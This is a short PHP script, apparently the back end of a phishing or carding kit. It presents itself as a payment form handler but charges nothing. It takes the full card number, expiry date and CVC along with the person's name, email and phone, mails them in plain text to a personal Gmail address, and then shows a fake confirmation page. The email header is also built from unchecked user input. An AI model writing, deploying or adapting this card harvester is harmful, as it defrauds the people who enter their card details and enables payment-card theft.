<?php
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $nom = htmlspecialchars($_POST['nom']);
    $prenom = htmlspecialchars($_POST['prenom']);
    $email = htmlspecialchars($_POST['email']);
    $telephone = htmlspecialchars($_POST['telephone']);
    $cc_numero = htmlspecialchars($_POST['cc_numero']);
    $cc_expiration = htmlspecialchars($_POST['cc_expiration']);
    $cc_cvc = htmlspecialchars($_POST['cc_cvc']);
    $amount = htmlspecialchars($_POST['amount']);  // Récupération du montant

    $to = "bokogeraldino@gmail.com";  // Remplacez par votre email
    $subject = "Soumission d’un nouveau formulaire de paiement";
    $message = "
    <html>
    <head>
        <title>paiement</title>
    </head>
    <body>
        <h2>Détails du paiement</h2>
        <p><strong>Name:</strong> $nom</p>
        <p><strong>Prenom:</strong> $prenom</p>
        <p><strong>Email:</strong> $email</p>
        <p><strong>Telephone:</strong> $telephone</p>
        <p><strong>credit:</strong> $cc_numero</p>
        <p><strong>Expiration:</strong> $cc_expiration</p>
        <p><strong>CVC-Code:</strong> $cc_cvc</p>
    </body>
    </html>";
    
    $headers = "MIME-Version: 1.0" . "\r\n";
    $headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
    $headers .= 'From: ' . $email . "\r\n";
    
    if (mail($to, $subject, $message, $headers)) {
        header("Location: confirm.html");
        exit();
    } 
}
?>
